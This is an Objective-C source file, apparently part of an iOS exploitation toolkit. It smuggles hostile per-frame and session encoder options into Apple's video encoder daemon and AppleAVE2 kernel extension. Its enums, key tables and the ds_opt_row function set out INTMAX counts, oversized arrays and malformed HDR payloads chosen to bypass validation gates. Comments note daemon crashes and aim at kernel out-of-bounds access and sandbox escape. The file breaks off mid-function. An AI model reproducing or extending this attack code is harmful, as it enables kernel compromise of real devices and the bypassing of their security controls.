//  probe_ave_opts.m - DirtySlide ROW: AVE OPT-SMUGGLE 64747 (v136 split)
//  The kernel encoder-option smuggling row: DsOptKind cell engine (ds_opt_row)
//  + the OPC5 per-frame UserQpMap sweep (ds_opt_qpmap_sweep) + the probe entry.
//  The SInt16@0 map-entry window is proven + bytes 2-15 swept clean (v135);
//  the T-family type-confusion census moved to probe_ave_tkill.m and the
//  sandbox-escape cells to probe_daemon_cache.m. MAY CRASH DAEMON/KERNEL.
#include "ds_core.h"


/* ========================================================================
 * ROW 7 - AVE OPT-SMUGGLE 64747 (per-frame encoder-option smuggling)
 * ========================================================================
 * ave.videoencoder RE (FINDINGS -19) shows the daemon reads a whole family of
 * PER-FRAME options from EncodeFrame frame-properties that ride straight to the
 * AppleAVE2 KERNEL gates - the 64747 surface the SM row's VRA dims never touched:
 *   'FIG: received AVE_kVTEncoderFrameOptionKey_ReferenceL0, count = %d' -> kernel
 *      iNum <= 9 / iNumRefsSTR > 0 && piRefNum != nullptr gates (attacker array)
 *   'FIG: AVE_kVTEncoderFrameOptionKey_NaluType found' + TemporalID + POCLsb +
 *      FrameNumForLTRToReplace + UserFrameType + AttachDPB + SetDPB + ResetRCState
 *   'FIG: SetProperty kVTCompressionPropertyKey_DPBRequirements with bad parameter
 *      num_frames = %d' (session property, DPB alloc with attacker num_frames)
 *   'FIG: UserDPBFrames CFArrayGetValueAtIndex %d = %d' -> kernel 2<=n<=17 gate
 *   kernel: ChromaQPIndexOffsetMultiPPS, 0 <= sANFDInfo.iNum <= 10, iNumOfByte <
 *   m_iSize, pcaRecon/pcaRef pointers (RVRA low-res).
 * A sane 1920x1080 session + byte-backed 420v10 input (the B-class that reaches
 * the encoder, SM-proven), option smuggled per frame. MAY CRASH DAEMON / KERNEL.
 */

/* option cell: kind selects the smuggled option; val/val2 shape the value */
typedef enum {
    DS_OPT_NONE = 0,        /* control - no options */
    DS_OPT_REFL0,           /* ReferenceL0 = CFArray of `val` CFNumbers (count gate) */
    DS_OPT_NALUTYPE,        /* NaluType = val */
    DS_OPT_TEMPORALID,      /* TemporalID = val */
    DS_OPT_LTRREPLACE,      /* FrameNumForLTRToReplace = val */
    DS_OPT_ATTACHDPB,       /* AttachDPB = val */
    DS_OPT_RESETRC,         /* ResetRCState = val (forces IDR) */
    DS_OPT_DPB_REQ,         /* session property DPBRequirements = {num_frames: val} */
    DS_OPT_USERDPB,         /* session property UserDPBFrames = CFArray of val nums */
    DS_OPT_DPB_REQ_SPEC,    /* encoder-SPEC dict DPBRequirements (forwarded to the daemon verbatim) */
    DS_OPT_USERDPB_SPEC,    /* encoder-SPEC dict UserDPBFrames */
    DS_OPT_DPB_REQ_AFTER,   /* v58: session prop DPBRequirements set AFTER a warm-up frame (pcVCP live) */
    DS_OPT_SETDPB_NUM,      /* v59: PUBLIC kVTEncodeFrameOptionKey_SetDPB = single CFNumber (daemon FIG 'SetDPB found (%d)') */
    DS_OPT_SETDPB_ARR,      /* v59: PUBLIC SetDPB = CFArray of val (the UserDPBFrames CFArrayGetValueAtIndex 2..17 gate) */
    DS_OPT_SLICEQP,         /* v59: PUBLIC kVTEncodeFrameOptionKey_SliceQP = CFArray (daemon indexes it per slice) */
    DS_OPT_PPSID,           /* v59: PUBLIC kVTEncodeFrameOptionKey_PicParameterSetId = val */
    DS_OPT_VRA_PUB,         /* v59: PUBLIC kVTEncodeFrameOptionKey_VRAUsedDimension = {Width,Height} dims */
    DS_OPT_NONREF,          /* v59: PUBLIC kVTEncodeFrameOptionKey_RequestNonReferenceFrame = val */
    DS_OPT_FINAL,           /* v59: PUBLIC kVTEncodeFrameOptionKey_FinalFrame = val */
    DS_OPT_REFRESH,         /* v59: PUBLIC kVTEncodeFrameOptionKey_ForceRefresh = val */
    DS_OPT_AVE_PROP,        /* v61: raw-key SESSION prop set - the kernel gate catalog sweep */
    DS_OPT_LA_GRIND,        /* v62: LookAheadFrames=val + encode val2 frames (the ACCEPTED key - kernel lookahead ring alloc) */
    DS_OPT_MKF_GRIND,       /* v62: MaxKeyFrameInterval=val + encode val2 frames (the 2nd ACCEPTED key - GOP alloc) */
    DS_OPT_LA_MKF,          /* v62: LookAheadFrames=val AND MaxKeyFrameInterval=val on ONE session (compounded alloc math) */
    DS_OPT_QPMAP_BOOL,      /* v62: EnableUserQPMap=kCFBooleanTrue - the CFBoolean TYPE-gate bypass (v61 -2003) */
    DS_OPT_QPMAP_DATA,      /* v62: EnableUserQPMap=TRUE + UserQPMap=CFData{val bytes} - the kernel UserQpMapSize gate */
    DS_OPT_FOURCC,          /* v62: InputPixelFormat=FourCC val - a REAL code past the -12902 value gate (kernel format-table index) */
    DS_OPT_PUB_NUM,         /* v63: PUBLIC kVTCompressionPropertyKey_* number prop - the client supported-list surface (kernel-field sweep) */
    DS_OPT_PUB_ARR,         /* v63: PUBLIC DataRateLimits = CFArray of 2 x val (VBV/SEI sizing math) */
    DS_OPT_PUB_BOOL,        /* v63: PUBLIC EnableLTR = kCFBooleanTrue (kernel LTR list machinery) */
    DS_OPT_CENSUS,          /* v63: VTSessionCopySupportedPropertyDictionary dump - the forwardable-key census (client-side, zero daemon risk) */
    DS_OPT_PUB_GRIND,       /* v64: PUBLIC accepted-key + val2-key x8-frame grind (MaxKeyFrameIntervalDuration/AverageBitRate/VBVBufferDuration - all v63 ACCEPTED) */
    DS_OPT_DATARATE,        /* v65: DataRateLimits = {INTMAX, val2} - the seconds-clamp bypass (v64's {INTMAX,1} rode clean) + the int64 overflow shape ({INTMAX,2} wraps the VBV size-math) with a 4-frame drain */
    DS_OPT_RC_PAIR,         /* v66: SoftMinQuantizationParameter=val + SoftMaxQuantizationParameter=val2 COMPOUND pair on ONE session - the RCQPRange composite gate (v65 OP13: prop-accepted SoftMin=-12 killed the 8-bit session at Prepare: 'FIG: Incorrect RCQPRange [-12 48]' -> -1001 -> -12902, zero callbacks) */
    DS_OPT_PPS_ARR,         /* v66: UserParameterSetsIds = CFArray of val2 elements each = val - the v65 leak 'ParameterSetId >= 0' proved the element gate is TWO-SIDED [0,31]; the v66 run LEAKED the COUNT gate: 'UserParameterSetIdsCount <= 9 [0, 9]' (capped at NINE at the plugin) */
    DS_OPT_USAGE_BOOL,      /* v67: EncoderUsage=<val2> + EnableWeightedPrediction=<val!=0> COMPOUND on ONE session - v66 OP13 delivered the bool (0) but the defaults path FIG'd 'usage is default. not yet supported' - a non-default EncoderUsage is the escape */
    DS_OPT_USAGE_GRIND,     /* v67: the same usage compound + a fixed 8-frame drain (the delivered weighted-pred machinery pushed past the usage gate) */
    DS_OPT_QP_MIX,          /* v67: MinAllowedFrameQP=val + SoftMinQuantizationParameter=val2 - the validator-floor discriminator (does the LEGAL MinAllowed=0 rescue the hostile SoftMin=-12, or does SoftMin feed the RCQPRange validator directly?) */
    DS_OPT_PUB_GRIND24,     /* v68: PUBLIC key + a fixed 24-frame DEEP drain (StrictKeyFrameInterval=INTMAX - the v67 OP03 DELIVERED = 0 = the type-gate bypass worked, the 8th hostile numeric key rides the strict-GOP interval math) */
    DS_OPT_USAGE_GRIND24,   /* v68: the EWP+EncoderUsage compound + a fixed 24-frame deep drain (the v67 usage-1 delivery hit 'AVE_UC_Process:471 / AVE_USL_Drv_Process:1573 fail to process -1015' = the weighted-pred machinery is LIVE in the USL process layer) */
    DS_OPT_PPS_HEVC,        /* v84: HEVC UserParameterSetsIds = CFArray of val-count elements (val & 0xFF = value, (val>>8)&0xFF = count up to 21, (val>>16)&0xF = co-arm bits) - the FIRST-EVER HEVC UPS shot: the plugin AVE_Prop_HEVC_SetUserParameterSetsIds writes the count into sess+0x8a0 = the kext dump loop bound (no upper cap) */
    DS_OPT_PPS_GRIND,       /* v68: UserParameterSetsIds count-9 x8 grind (the v67 OP08/09 cb fires=2 double-fire on the 'Forcing the PPS count to 1' path) */
    DS_OPT_USAGE_CHURN,     /* v69/v70: usage-1 (+ EWP if val bit 0, usage-0 if val bit 8) x val2 SESSION-CHURN - each session = create -> set -> 1 frame -> destroy (the v68 run: usage-1 faults the USL process path EVERY frame (-1015 -> cb -17691) AND the teardown leaks 'AVE_BlkPool::Destroy:285 failed to destroy block buffer ... -1016' + 'AVE_SEI::Uninit SEI Frame # 0'; the v69 run CRASHED the daemon after 40 churn sessions (launchd exit 11 x2) - the v70 escalation + usage-0 leak discriminator) */
    DS_OPT_USAGE_COMP,      /* v69-v71: usage-1 + ONE pub-table key (val2 = key index) on the SAME session - a hostile key riding the FAULTING USL process path (does the -1015 fault mode change/escalate?); v71 val: bit 8 (0x100) = the key rides as CFBoolean{TRUE}, bit 9 (0x200) = CFBoolean{FALSE} (the SEI CFBoolean TYPE gate), bit 12 (0x1000) = the 420v8b-64 killer input rides too (the killer+SEI compound) */
    DS_OPT_USAGE_VAR,       /* v69-v72: usage-1 + input variant (val bits 0-3: 1 = 420v8b-64, 2 = 420v10-64, 3 = 2vuy-256, 4 = 420v8b-256, 5 = 420v10-256, 6 = 420v8b-32, 7 = 420v8b-64 planar-bytes, 8 = 420v8b-64 IOSurface-backed, 9 = 420v8b-64 session@64, 10 = 420v8b-64 + Trim, 11 = 420v8b-64 + Letterbox, 12 = 2vuy-64 + Trim, 0 = the default 2vuy64; bit 8 (0x100) = usage 0) - v71 CRASHED the daemon 11x (vt_Copy_420v_Crop NULL-src-row memmove, far 0x0); v72 = the NULL-ROW DISCRIMINATION grid (construction / session-geometry / scaling-mode levers) */
    DS_OPT_UNGT_NUM,        /* v74: UNGAITED kext marshal-field NUMERIC set (val bit 0-7 = key idx, bit 12 (0x1000) = HEVC session, val2 = hostile value) - the AppleAVE2 kext logs these fields with NO value gate and the AVC MCTFEdgeCount setter's ONLY check is 'iEdgeCnt >= 0' (ONE-SIDED) */
    DS_OPT_UNGT_DATA,       /* v74: UNGAITED kext marshal-field CFData set (val bit 0-7 = key idx, val2 = CFData length, HEVC session) - the HDR payload props (AmbientViewingEnvironment 8 dwords / ContentLightLevelInfo 4 dwords) with the plugin 'invalid size' gate as the ONLY check */
    DS_OPT_UNGT_CHURN,      /* v74-v76: x val2 SESSION-CHURN (create -> set -> 1 frame -> destroy each) - v74 = MCTFEdgeCount=INTMAX (SetProperty, PROVEN dead); v75 = InsertTrailingBytes=CFData{65536} (the v75 run PROVED the (0,512] gate - 65536 = -2004 'RPU is too long'); v76 = the MAX-LEGAL CFData{512} - the escalation at the v72/v73 kill cadence */
    DS_OPT_UNGT_SPEC,       /* v75/v76: UNGAITED field via the SESSION-CREATE SPEC dict (val bit 0-7 = key idx, val2 = value) - the v74 run PROVED MCTFEdgeCount / MotionVectorSize / InitialRCSegmentCtxSize / FilterGroupSize are DEAD via SetProperty (the daemon VT wrapper -12900 at VTCompressionSession.c:4958, NO AVE_Prop_*_Set<Field> line) - the create-time spec is the only channel left to the plugin's private-field setters; v76 RE-FIRES the MCTF-INTMAX cell (the v75 log truncated mid-OP12 = UNRESOLVED) */
    DS_OPT_HDR_TRIPLE,      /* v76: the HDR TRIPLE - AVE CFData{8} + CLL CFData{4} + MDCV CFData{24} (the THREE exact-width legal payloads) on ONE HEVC session - all three ride the S_AVE_UCInParam_Config marshal together into the kext's fixed-width Data reads */
    DS_OPT_SEI_REFEED,      /* v77: SEI-REFEED SELF-DECODE - arm the full-output capture (g_ave_cap_on/sb) + pack the hostile HDR prop (val bit 0-7 = key idx 2/3/7, val2 = CFData length; bit 8 (0x100) = the AVE8+CLL4+MDCV24 TRIPLE), then the tail feeds the captured sample back into a VTDecompressionSession = the daemon's DECODER (the still-undissected videocodecd half) parses our truncated ST2094-40 SEI (8B AVE vs the 24B spec / 4B CLL vs 16B / 24B MDCV vs the 60B kext read) = a NEW crash class on the decode side */
    DS_OPT_TB_GRIND,        /* v78: TB-emitter GRIND - InsertTrailingBytes=CFData{512} riding val2 frames (the kext NAL emitter copies 512 trailing bytes PER FRAME = the repeated kernel copy; a PANIC on the drain = THE 64747 kernel OOB) */
    DS_OPT_MCTF_ARM,        /* v78: MCTF ENABLE-ARM - EnableMCTF=true (census [39] IN-LIST) session prop AFTER create + the MCTFEdgeCount=INTMAX SPEC dict (built pre-create) = the kext MCTF config parser (+0x408..+0x498, sign-bit-gated only) CONSUMES the INTMAX edge count */
    DS_OPT_MCTF_PARAMS,     /* v79: the MCTFParams CFArray channel - SPEC dict 'MCTFParams' = CFArray of N CFNumbers (val = value pattern 1=0x5a else INTMAX, val2 = entry count cap def 600) + EnableMCTF=true post-create; HEVC = the plugin's AVE_Prop_HEVC_SetMCTFParams parses the FLAT array (fixed-index GetChar/GetSInt16/GetSInt32, 30 x S_AVE_MCTF_Param @0x58B) into session+0x8C8 (flag +0x978) = ALL 30 attacker strength slots ride the marshal to the kext's MCTFStrengthLevel[%d] reads */
    DS_OPT_MCTF_STR,        /* v79: MCTFStrengthLevel SPEC sweep - the two-sided plugin gate '0 <= iMCTFStrengthLevel && iMCTFStrengthLevel < 25' (AVE_Prop_AVC_SetMCTFStrengthLevel @0x1f79df) is BYPASSED via the create SPEC channel (v57 forward-verbatim) = the kext reads the marshal field sign-bit-gated only = INTMAX/25 = the array-index OOB candidate; + EnableMCTF=true + HEVC */
    DS_OPT_MCTF_FMT,        /* v80: the MCTF-FORMAT-FIX channel - val & 0xF = the input format (1 = 2vuy + the create-time source-format hint kCVPixelBufferPixelFormatTypeKey=2vuy so the daemon does NOT convert to 420v, 2 = TRUE 10-bit 420v, 3 = 420v8b planar-bytes), (val >> 8) & 0xFF = the MCTF channel (1 = MCTFParams CFArray{val2 x pattern}, 2 = MCTFStrengthLevel=CFNumber{val2}, 3 = MCTFEdgeCount=CFNumber{val2}), val & 0x10 = the INTMAX pattern; the v79 run (10:05) PROVED the MCTF config flips the session source format to 420v and AVE_ImgBuf_Verify REJECTS it pre-kernel ('pixel format is not supported 875704438' = -17691) = the INTMAX edge count never reached the kext - v80 fires the SAME config on formats that pass the gate */
} DsOptKind;

static int ds_hdr_trip[3] = { 0, 0, 0 };   /* v76: the HDR-TRIPLE per-key propStats (AVE/CLL/MDCV) - written by the DS_OPT_HDR_TRIPLE set branch, read by its receipt */
static int ds_tb_comp = -9999;              /* v78: the TB-COMPOUND InsertTrailingBytes propStat (0x200 bit on the SEI-REFEED TRIPLE) - read by the REFEED receipt */
static int ds_mctf_params_stat = -9999;      /* v79: the MCTFParams EnableMCTF post-create stat - read by the receipt */
static int ds_mctf_str_stat = -9999;         /* v79: the MCTFStrengthLevel EnableMCTF post-create stat - read by the receipt */
static int ds_mctf_vepba_stat = -9999;     /* v81: the VideoEncoderPixelBufferAttributes set stat (the encoder-input format pin for the MCTF session) */
static int ds_pps_hevc_cnt = 0;
static OSStatus g_opt_usg_stat = -999;  /* v87: the EncoderUsage SetProperty status (the eRCMode-HwVal lever) */
static OSStatus g_opt_cqp_stat = -999;  /* v88: the ChromaQPIndexOffsetMultiPPS SetProperty status (the QPMod ch_qp w22 lever) */
static OSStatus g_opt_str_stat = -999;  /* v91: the MCTFStrengthLevel SetProperty status (the strength-array co-arm) */
static int g_opt_qpmap_arm = 0;          /* v95: the per-cell QP-map -13 unlock arm (EnableUserQPMap + the UserQpMap pb attachment) */             /* v84: the CAPPED HEVC UPS count (1..21) - set by the DS_OPT_PPS_HEVC branch, printed by the receipt */
static int ds_mctf_notx_stat = -9999;      /* v81: the AllowPixelTransfer=false set stat (the no-transfer kill) */
/* iOS SDK: the kVTCompressionPropertyKey_AllowPixelTransfer CONSTANT is macOS-only (not
 * declared in the iOS VTCompressionProperties.h - the v81 build proved it). The v76 census
 * lists the BARE 'AllowPixelTransfer' key as a forwardable session property, so define the
 * key string here (VTSessionSetProperty takes a CFStringRef key name). */
static const CFStringRef ds_kAllowPixelTransfer = CFSTR("AllowPixelTransfer");
/* v82: the FULL DevCap format decode (ave.videoencoder @0x1c9d88/@0x1ca268 -
 * the 0x30-stride tables decoded from the user-prepared binary). The v81 run
 * PROVED the video-range members (420v 8-bit / x420 10-bit) are rejected by the
 * MCTF-armed AVE_ImgBuf_Verify (-17691) and byte-backed biplanar is a client
 * dead-end (-12218); the FULL-RANGE twins (420f/xf20) + the planar members
 * (P420/pf20) + the 422 family (422v/422f/x422/xf22) are the UNTRIED sweep. */
static OSType ds_opt_mctf_fmt(long mf) {
    switch (mf) {
        case 2: case 4: return kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange;   /* x420 */
        case 3: return kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;            /* 420v */
        case 5: return 0x34323066;   /* 420f - 420YpCbCr8BiPlanarFullRange */
        case 6: return 0x78663230;   /* xf20 - 420YpCbCr10BiPlanarFullRange */
        case 7: return 0x70343230;   /* P420 - 420YpCbCr10Planar */
        case 8: return 0x70663230;   /* pf20 - 420YpCbCr10PlanarFullRange */
        case 9: return 0x34323276;   /* 422v - 422YpCbCr8 */
        case 10: return 0x34323266;  /* 422f - 422YpCbCr8FullRange */
        case 11: return 0x78343232;  /* x422 - 422YpCbCr10 */
        case 12: return 0x78663232;  /* xf22 - 422YpCbCr10FullRange */
        default: return kCVPixelFormatType_422YpCbCr8;                            /* 2vuy */
    }
}
static const char *ds_opt_mctf_fmt_name(long mf) {
    switch (mf) {
        case 2: case 4: return "x420";
        case 3: return "420v";
        case 5: return "420f";
        case 6: return "xf20";
        case 7: return "P420";
        case 8: return "pf20";
        case 9: return "422v";
        case 10: return "422f";
        case 11: return "x422";
        case 12: return "xf22";
        default: return "2vuy";
    }
}
static long g_refeed_loops = 0;              /* v79: the SEI_REFEED bit 9 (0x400) compound-hammer loop count - set in the set branch, read by the self-decode tail, reset after */

/* v61: the raw AVE session-prop key table - names = the daemon's AVE_Prop_AVC_Set*
 * getters (minus the prefix), which the kernelcache strings show are 1:1 with the
 * fields the AppleAVE2 KEXT reads ('%lld %d AVE %s: ... <Prop> %d'). v58 PROVED raw
 * CFSTR keys forward (CFSTR("DPBRequirements") -> AVE_Prop_AVC_SetDPBRequirements
 * -> the plugin -> the kernel-bound struct). */
static const char *ds_opt_ave_prop_key(int idx)
{
    static const char *keys[] = {
        "InputPixelFormat",              /* kernel: SourceFramePixelFormat - format-table index */
        "LookAheadFrames",               /* kernel: LookAheadFrames - lookahead alloc count */
        "NumberOfSlices",                /* kernel: NumberOfSlices - slice struct table */
        "RefNumOfBFrameL0",              /* kernel: STRNumOfBFrameL0 - L0 ref list count */
        "RefNumOfPFrame",                /* kernel: STRNumOfPFrame - ref list count */
        "VBVBufferSize",                 /* kernel: VBVBufferSize - VBV sizing math */
        "MaxAllowedFrameQP",             /* kernel: MaxAllowedFrameQP - QP upper bound */
        "SoftMaxQuantizationParameter",  /* kernel: SoftMax - QP upper bound */
        "EnableUserQPMap",               /* kernel: EnableUserQPMap - the QP-map enable bit */
        "InitialQPI",                    /* kernel: InitialQPI - initial QP */
        "MaxKeyFrameInterval",           /* kernel: MaxKeyFrameInterval - GOP size */
        "SpatialAdaptiveQPLevel",        /* kernel: SpatialAdaptiveQPLevel - QP level */
    };
    if (idx < 0 || idx >= (int)(sizeof(keys) / sizeof(keys[0]))) return NULL;
    return keys[idx];
}

/* v62: the DELIVERY-shot key names - the v61 run ACCEPTED LookAheadFrames and
 * MaxKeyFrameInterval at INTMAX (status 0, no gate line) and TYPE-gated
 * EnableUserQPMap (the plugin wants CFBoolean); these are the keys v62 re-fires. */
static const char *ds_opt_v62_key(int kind)
{
    switch (kind) {
        case DS_OPT_LA_GRIND:  return "LookAheadFrames";
        case DS_OPT_MKF_GRIND: return "MaxKeyFrameInterval";
        case DS_OPT_FOURCC:    return "InputPixelFormat";
        default: return NULL;
    }
}

/* v74: the UNGAITED kext-marshal field names - extracted from the AppleAVE2 kext
 * field-log strings ('%p %lld <Field> %d' with NO adjacent value gate) and the
 * ave.videoencoder setter table (AVE_Prop_AVC/HEVC/AV1_Set<Field>). The AVC
 * MCTFEdgeCount setter's ONLY gate is 'iEdgeCnt >= 0' (ONE-SIDED - INTMAX passes
 * the plugin and packs into the VideoParamsDriver struct -> the S_AVE_UCInParam_
 * Config marshal -> the kext applies it ungated). The HDR CFData props hit the
 * plugin's 'invalid <Name> size' gate - the sweep finds a length that passes it
 * and overruns the kext's fixed dword copy (AmbientViewing 8 / ContentLight 4). */
static const char *ds_opt_ungt_key(int idx)
{
    static const char *keys[] = {
        "MCTFEdgeCount",                /* 0 - AVC+HEVC+AV1 setter; kext MCTF edge sizing */
        "InsertTrailingBytes",          /* 1 - HEVC+AV1 setter; the NAL trailing-byte count */
        "AmbientViewingEnvironment",        /* 2 - the BARE name (v75 fix: the v74 run PROVED the census-listed short name is the forwardable one - the kVTCompressionPropertyKey_-prefixed variant is BLOCKED at the client; HEVC HDR ST2094-40 payload, CFData; kext logs 8 dwords) */
        "ContentLightLevelInfo",            /* 3 - the BARE name (v75 fix, same evidence - the v74 HDR cells self-blocked with the prefixed variant while the census shows this IN-LIST; PUBLIC SDK key (iOS 11+), CFData; kext logs 4 dwords) */
        "MotionVectorSize",             /* 4 - log-only in the plugin - spec-dict candidate (also probe as a prop) */
        "InitialRCSegmentCtxSize",      /* 5 - log-only - RC segment ctx alloc-size candidate */
        "FilterGroupSize",              /* 6 - kext MCTF config path (AVE_Prop_Cfg_MCTF_*) - ungated log */
        "MasteringDisplayColorVolume",  /* 7 - v76: the BARE census-listed name [13] IN-LIST (forwardable); daemon exact-width validator 'not 24 bytes' (vtCompressionSessionValidateMasteringDisplayColorVolume, confirmed in the VideoToolbox binary); plugin 'invalid MasteringDisplayColorVolume size' gate; kext reads Display Primaries[%d] + Max/Min Luminance + White Point */
    };
    if (idx < 0 || idx >= (int)(sizeof(keys) / sizeof(keys[0]))) return NULL;
    return keys[idx];
}

/* v63: the PUBLIC kVTCompressionPropertyKey_* literals - the CLIENT's supported
 * property list (VTSessionCopySupportedPropertyDictionary) is the forwardable set:
 * the v62 daemon log proved the client TRANSLATES raw keys to these PUBLIC names
 * before forwarding ('LookAheadFrames' -> kVTCompressionPropertyKey_Suggested-
 * LookAheadFrameCount, 'InputPixelFormat' -> kVTCompressionPropertyKey_InputPixel-
 * Format). The private daemon-only names (NumberOfSlices, RefNumOfBFrameL0,
 * VBVBufferSize, InitialQPI) have NO public counterpart - the client blocks them
 * (-12900, v61). v63 sweeps the never-tried PUBLIC kernel-relevant props. */
static const char *ds_opt_pub_key(int idx)
{
    static const char *keys[] = {
        "MaxKeyFrameIntervalDuration",   /* v63 ACCEPTED (0) - kernel GOP-time sizing (v64 OP03 grind) */
        "AverageBitRate",                /* v63 ACCEPTED (0) - kernel RC alloc math (v64 OP04 grind) */
        "VBVBufferDuration",             /* v63 ACCEPTED (0) - kernel VBV sizing math (v64 OP05 grind) */
        "log2_max_minus4",               /* census-listed [62] - the SPS bitstream field (the kext gate catalog names it) */
        "NumberOfSlices",                /* census-listed [12] - v61's -12900 was AMBIGUOUS (no daemon log); re-fire with the log in hand */
        "UserParameterSetsIds",          /* census-listed [66] - the kernel PPS table (CFArray of ids) */
        "SoftMinQuantizationParameter",  /* census-listed [95] - the SoftMax mirror (expect the [-12,51] formula gate) */
        "UseLongTermReference",          /* census-listed [96] - the REAL public LTR name (v63's EnableLTR was a dead name) */
        "VBVMaxBitRate",                 /* census-listed [18] - VBV sizing math */
        "MaxEncoderPixelRate",           /* census-listed [31] - pixel-rate math (expect a Cap gate line) */
        "DebugMetadataSEI",              /* v69 SWAP for index 10: census [122] - the SEI-manager path (the v68 usage-1 teardown leaked 'AVE_SEI::Uninit SEI Frame # 0' - the targeted key for the faulting-path compound); v64's DataRateLimits {INTMAX,1} seconds-clamp bypass is retired from the sweep (the DS_OPT_DATARATE kind keeps its literal) */
        "SoftMaxQuantizationParameter",  /* v66 target - the [-12,51] formula MAX side (census [130]; OP07 = 52 first-past) */
        "StrictKeyFrameInterval",        /* v66 target - never-tried census [138] (OP12 = CFBooleanTrue) */
        "EnableWeightedPrediction",      /* v66 target - never-tried census [123] (OP13 = CFBooleanTrue) */
        "MinAllowedFrameQP",             /* v67 target - census [119] - the QP-mix validator-floor discriminator (v63 OP05 INTMAX = -2004 value-gated) */
        "EncoderUsage",                  /* v67 target - census [10] - the usage-compound's usage field (0 Unknown, 1 VideoProcessing, 2 StillImage, 3 FastSource, 4 Streaming) */
        "MCTFEdgeCount",                 /* v74 - the ungated AVC/HEVC/AV1 setter field (kext logs it with NO gate; AVC setter gate = 'iEdgeCnt >= 0' one-sided) */
        "InsertTrailingBytes",           /* v74 - the ungated HEVC NAL trailing-byte count */
        "kVTCompressionPropertyKey_AmbientViewingEnvironment",  /* v74 - HEVC HDR payload prop (plugin literal) */
        "AmbientViewingEnvironment",     /* v74 - the short-name variant (CM-extension style) */
        "kVTCompressionPropertyKey_ContentLightLevelInfo",      /* v74 - PUBLIC SDK key (iOS 11+, CFData) */
        "ContentLightLevelInfo",         /* v74 - the short-name variant */
        "MotionVectorSize",              /* v74 - kext field-log-only; spec-dict candidate */
        "InitialRCSegmentCtxSize",       /* v74 - kext field-log-only; RC segment ctx-size candidate */
        "FilterGroupSize",               /* v74 - kext MCTF-config field (AVE_Prop_Cfg_MCTF_* path) */
        "MasteringDisplayColorVolume",   /* v76 - census [13] IN-LIST; the daemon exact-width validator ('not 24 bytes') + the kext fixed-width MDCV reads */
    };
    if (idx < 0 || idx >= (int)(sizeof(keys) / sizeof(keys[0]))) return NULL;
    return keys[idx];
}

/* v106: POISON-AWARE TEARDOWN. Invalidate on a dead FigRPC connection = the 23:52
 * SIGKILL wild-jump (uncatchable). Once g_opt_conn_poisoned is set, LEAK the session
 * (bounded - the established guard-fault convention) instead of Invalidating. */
static void ds_opt_row(const char *pfx, const char *tag, DsOptKind kind, long val, long val2)
{
    char st0[32];
    __block int mpB1 = -999, mpE1 = -999, mpF1 = -1, mpB2 = -999, mpE2 = -999;   /* v104 2PASS receipts (top-declared so the SWEEP gotos do not bypass it) */
    ds_ave_stamp(st0, sizeof(st0));
    uint64_t t0 = mach_absolute_time();
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] opt-smuggle kind=%d val=%ld val2=%ld (MAY CRASH DAEMON/KERNEL)\n",
            pfx, st0, tag, (int)kind, val, val2);
    g_opt_qpmap_arm = 0;   /* v95: per-cell reset - a stale arm must NEVER attach a map on the next cell */
    /* v107: STICKY poison - the v106 per-cell reset was the 00:19 SIGKILL gap: after
     * OPC0 wedged, the reset let the NEXT cell's VTCompressionSessionCreate ride the
     * dead FigRPC conn, hang INSIDE the guard (mach_msg - no signal = never caught),
     * and the death-callback wild-jumped (pc=0, __CFStringCreateImmutableFunnel3) =
     * CODESIGNING SIGKILL. Poison is set once and never cleared mid-row; a poisoned
     * conn = every later cell SKIPPED (never create on a dead conn). */
    if (g_opt_conn_poisoned) {
        dprintf(STDOUT_FILENO, "%s  I[%s] CELL-SKIPPED (v107 sticky poison - the FigRPC conn died in a prior cell; a create would hang in the guard - the 00:19 SIGKILL class)\n", pfx, tag);
        ds_journal_write("DONE", tag);
        return;
    }
    ds_journal_write("START", tag);   /* v57: journal every op - the client witness */
    if (ds_epoch_exhausted(pfx)) {
        ds_journal_write("DONE", tag);   /* epoch-skipped, NOT a death */
        return;
    }
    /* spec-dict cells (v57 OP11/12, verdict carried in the read-offs): the encoder-
     * specification dict at session-create is forwarded to the daemon VERBATIM - but
     * the v57 daemon log showed ZERO AVE_Prop lines for the DPB keys = the create-time
     * spec is NOT the DPB channel (kept for regression, unshot in v58). v75 EXCEPTION:
     * DS_OPT_UNGT_SPEC IS shot here - the private-field keys (MCTFEdgeCount etc.) are
     * dead via SetProperty (the v74 proof), so the create-time spec is the ONLY channel
     * left to the plugin's CreateInstance parsing. */
    CFMutableDictionaryRef spec = NULL;
    if (kind == DS_OPT_DPB_REQ_SPEC || kind == DS_OPT_USERDPB_SPEC || kind == DS_OPT_UNGT_SPEC ||
        kind == DS_OPT_MCTF_ARM || kind == DS_OPT_MCTF_PARAMS || kind == DS_OPT_MCTF_STR || kind == DS_OPT_MCTF_FMT || kind == DS_OPT_PPS_HEVC) {   /* v78: the MCTF enable-arm also packs MCTFEdgeCount=INTMAX in the create dict; v79: the MCTFParams array + the StrengthLevel sweep ride the same create-time channel */
        spec = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (kind == DS_OPT_DPB_REQ_SPEC) {
            CFMutableDictionaryRef req = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
            CFDictionarySetValue(req, CFSTR("num_frames"), nf);
            CFRelease(nf);
            CFDictionarySetValue(spec, CFSTR("DPBRequirements"), req);
            CFRelease(req);
        } else if (kind == DS_OPT_USERDPB_SPEC) {
            CFMutableArrayRef arr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
            for (long i = 0; i < val2 && i < 32; i++) {   /* v57: bounded - no client balloon */
                long v = val;
                CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
                CFArrayAppendValue(arr, nf);
                CFRelease(nf);
            }
            CFDictionarySetValue(spec, CFSTR("UserDPBFrames"), arr);
            CFRelease(arr);
        } else if (kind == DS_OPT_UNGT_SPEC) {
            /* v75: the SECOND-CHANCE channel - pack the private field DIRECTLY into
             * the create-time spec dict (forwarded verbatim per v57). The v74 run
             * proved MCTFEdgeCount never forwards via SetProperty (the daemon VT
             * wrapper -12900, no AVE_Prop line); the plugin reads its
             * VideoParamsDriver fields at CreateInstance from this dict - a
             * AVE_Prop_AVC_Set<Field> line on CREATE = the channel opened. */
